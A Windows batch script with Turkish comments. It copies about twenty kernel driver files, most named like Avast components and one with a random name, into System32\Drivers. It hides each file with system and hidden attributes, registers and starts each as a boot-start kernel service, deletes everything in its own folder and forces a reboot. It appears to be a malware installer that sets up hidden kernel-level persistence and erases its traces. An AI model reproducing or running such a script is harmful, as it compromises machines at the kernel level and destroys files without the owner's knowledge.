@echo off

set "system32Dir=C:\Windows\System32\Drivers"

:: Sürücü dosyalarını taşı
if exist "%~dp0awsSP64.sys" (
    move /y "%~dp0awsSP64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\awsSP64.sys"
    sc create awsSP64 type= kernel start= boot binpath= "%system32Dir%\awsSP64.sys"
    sc start awsSP64
)

if exist "%~dp0awsSnx64.sys" (
    move /y "%~dp0awsSnx64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\awsSnx64.sys"
    sc create awsSnx64 type= kernel start= boot binpath= "%system32Dir%\awsSnx64.sys"
    sc start awsSnx64
)

if exist "%~dp0aswbidsdriver64.sys" (
    move /y "%~dp0aswbidsdriver64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsdriver64.sys"
    sc create aswbidsdriver64 type= kernel start= boot binpath= "%system32Dir%\aswbidsdriver64.sys"
    sc start aswbidsdriver64
)

if exist "%~dp0aswArDisk64.sys" (
    move /y "%~dp0aswArDisk64.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArDisk64.sys"
    sc create aswArDisk64 type= kernel start= boot binpath= "%system32Dir%\aswArDisk64.sys"
    sc start aswArDisk64
)

if exist "%~dp0aswNetHub.sys" (
    move /y "%~dp0aswNetHub.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswNetHub.sys"
    sc create aswNetHub type= kernel start= boot binpath= "%system32Dir%\aswNetHub.sys"
    sc start aswNetHub
)

if exist "%~dp0aswRdr2.sys" (
    move /y "%~dp0aswRdr2.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswRdr2.sys"
    sc create aswRdr2 type= kernel start= boot binpath= "%system32Dir%\aswRdr2.sys"
    sc start aswRdr2
)

if exist "%~dp0aswRvrt.sys" (
    move /y "%~dp0aswRvrt.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswRvrt.sys"
    sc create aswRvrt type= kernel start= boot binpath= "%system32Dir%\aswRvrt.sys"
    sc start aswRvrt
)

if exist "%~dp0aswSnx.sys" (
    move /y "%~dp0aswSnx.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswSnx.sys"
    sc create aswSnx type= kernel start= boot binpath= "%system32Dir%\aswSnx.sys"
    sc start aswSnx
)

if exist "%~dp0aswSP.sys" (
    move /y "%~dp0aswSP.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswSP.sys"
    sc create aswSP type= kernel start= boot binpath= "%system32Dir%\aswSP.sys"
    sc start aswSP
)

if exist "%~dp0aswStm.sys" (
    move /y "%~dp0aswStm.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswStm.sys"
    sc create aswStm type= kernel start= boot binpath= "%system32Dir%\aswStm.sys"
    sc start aswStm
)

if exist "%~dp0aswVmm.sys" (
    move /y "%~dp0aswVmm.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswVmm.sys"
    sc create aswVmm type= kernel start= boot binpath= "%system32Dir%\aswVmm.sys"
    sc start aswVmm
)

if exist "%~dp0ySrU9QwDq7wjoDzd.sys" (
    move /y "%~dp0ySrU9QwDq7wjoDzd.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\ySrU9QwDq7wjoDzd.sys"
    sc create ySrU9QwDq7wjoDzd type= kernel start= boot binpath= "%system32Dir%\ySrU9QwDq7wjoDzd.sys"
    sc start ySrU9QwDq7wjoDzd
)

if exist "%~dp0aswMonFlt.sys" (
    move /y "%~dp0aswMonFlt.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswMonFlt.sys"
    sc create aswMonFlt type= kernel start= boot binpath= "%system32Dir%\aswMonFlt.sys"
    sc start aswMonFlt
)

if exist "%~dp0aswKbd.sys" (
    move /y "%~dp0aswKbd.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswKbd.sys"
    sc create aswKbd type= kernel start= boot binpath= "%system32Dir%\aswKbd.sys"
    sc start aswKbd
)

if exist "%~dp0aswElam.sys" (
    move /y "%~dp0aswElam.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswElam.sys"
    sc create aswElam type= kernel start= boot binpath= "%system32Dir%\aswElam.sys"
    sc start aswElam
)

if exist "%~dp0aswbuniv.sys" (
    move /y "%~dp0aswbuniv.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbuniv.sys"
    sc create aswbuniv type= kernel start= boot binpath= "%system32Dir%\aswbuniv.sys"
    sc start aswbuniv
)

if exist "%~dp0aswbidsh.sys" (
    move /y "%~dp0aswbidsh.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsh.sys"
    sc create aswbidsh type= kernel start= boot binpath= "%system32Dir%\aswbidsh.sys"
    sc start aswbidsh
)

if exist "%~dp0aswbidsdriver.sys" (
    move /y "%~dp0aswbidsdriver.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswbidsdriver.sys"
    sc create aswbidsdriver type= kernel start= boot binpath= "%system32Dir%\aswbidsdriver.sys"
    sc start aswbidsdriver
)

if exist "%~dp0aswArPot.sys" (
    move /y "%~dp0aswArPot.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArPot.sys"
    sc create aswArPot type= kernel start= boot binpath= "%system32Dir%\aswArPot.sys"
    sc start aswArPot
)

if exist "%~dp0aswArDisk.sys" (
    move /y "%~dp0aswArDisk.sys" "%system32Dir%"
    attrib +s +h "%system32Dir%\aswArDisk.sys"
    sc create aswArDisk type= kernel start= boot binpath= "%system32Dir%\aswArDisk.sys"
    sc start aswArDisk
)

:: Betiğin bulunduğu klasördeki tüm dosyaları sil
del /q /f "%~dp0*.*"

:: Sistemi yeniden başlat
C:\Windows\system32\cmd.exe /c shutdown /r /t 5

exit